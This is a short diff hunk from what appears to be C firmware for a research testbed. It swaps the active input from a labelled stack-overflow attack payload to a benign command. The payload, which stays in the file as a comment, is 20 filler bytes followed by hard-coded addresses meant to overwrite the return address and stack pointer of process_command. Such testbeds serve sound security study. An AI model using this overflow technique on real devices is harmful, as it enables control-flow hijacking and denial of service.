@@ -1462,11 +1462,11 @@ void application(){
 #define cmd_all             'a'
 
 /** Benign: calls Ultrasonic only **/
-// char input[4] = {'u', 0, 16, ':'};
+char input[4] = {'u', 0, 16, ':'};
 //
 /** Attack: overwrites return address and stack pointer to cause infinite loop in process_command function **/ 
 //
-char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xcd, 0x05, 0x04, 0x08, ':'};
+// char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xcd, 0x05, 0x04, 0x08, ':'};
 //
 uint32_t data[4] = {0,0,0,0};
 uint8_t temp_data[5] = {0,0,0,0,0};
